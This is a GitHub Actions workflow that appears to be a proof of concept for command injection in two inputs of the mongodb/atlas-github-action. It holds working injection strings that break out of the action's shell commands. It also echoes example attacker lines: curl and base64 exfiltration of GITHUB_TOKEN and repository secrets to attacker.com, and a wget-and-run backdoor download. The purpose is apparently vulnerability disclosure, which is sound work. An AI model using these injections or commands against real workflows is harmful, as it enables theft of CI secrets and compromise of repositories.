name: POC - Comprehensive Command Injection Demonstration

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  comprehensive-poc:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Demonstrate Multiple Injection Vectors - Delete Project
        uses: mongodb/atlas-github-action@v0.2.0
        continue-on-error: true
        with:
          # Injection via delete-project-id
          # Format: atlas project delete ${{ inputs.delete-project-id }} --force
          # Using --help makes the command succeed, then our injected commands execute
          delete-project-id: "--help --force; echo '=== INJECTION 1: delete-project-id ===' > /tmp/injection1.txt && date >> /tmp/injection1.txt && uname -a >> /tmp/injection1.txt #"
      
      - name: Demonstrate Multiple Injection Vectors - Delete Cluster
        uses: mongodb/atlas-github-action@v0.2.0
        continue-on-error: true
        with:
          # Injection via delete-cluster-name
          # Format: atlas cluster delete ${{ inputs.delete-cluster-name }} --force --projectId ${{ inputs.delete-project-id }}
          # Using --help makes the command succeed, then our injected commands execute
          delete-cluster-name: "--help --force; echo '=== INJECTION 2: delete-cluster-name ===' > /tmp/injection2.txt && whoami >> /tmp/injection2.txt && pwd >> /tmp/injection2.txt #"
          delete-project-id: "507f1f77bcf86cd799439011"

      - name: Verify Injections Executed
        shell: bash
        run: |
          echo "=========================================="
          echo "VULNERABILITY CONFIRMED - Multiple Vectors"
          echo "=========================================="
          echo ""
          if [ -f /tmp/injection1.txt ]; then
            echo "✅ Injection 1 (delete-project-id) executed:"
            cat /tmp/injection1.txt
            echo ""
          fi
          if [ -f /tmp/injection2.txt ]; then
            echo "✅ Injection 2 (delete-cluster-name) executed:"
            cat /tmp/injection2.txt
            echo ""
          fi
          echo "An attacker could inject commands that:"
          echo ""
          echo "1. Exfiltrate Secrets:"
          echo "   curl https://attacker.com/steal?token=\$GITHUB_TOKEN"
          echo ""
          echo "2. Access Repository Secrets:"
          echo "   echo \${{ secrets.SOME_SECRET }} | base64 | curl -X POST https://attacker.com"
          echo ""
          echo "3. Modify Artifacts:"
          echo "   echo 'malicious code' > artifact.txt"
          echo ""
          echo "4. Access Other Repositories:"
          echo "   gh repo list --limit 100"
          echo ""
          echo "5. Install Backdoors:"
          echo "   wget https://attacker.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh"
          echo ""
          echo "All of these would execute with the permissions of the GITHUB_TOKEN"
          echo "associated with the workflow run."
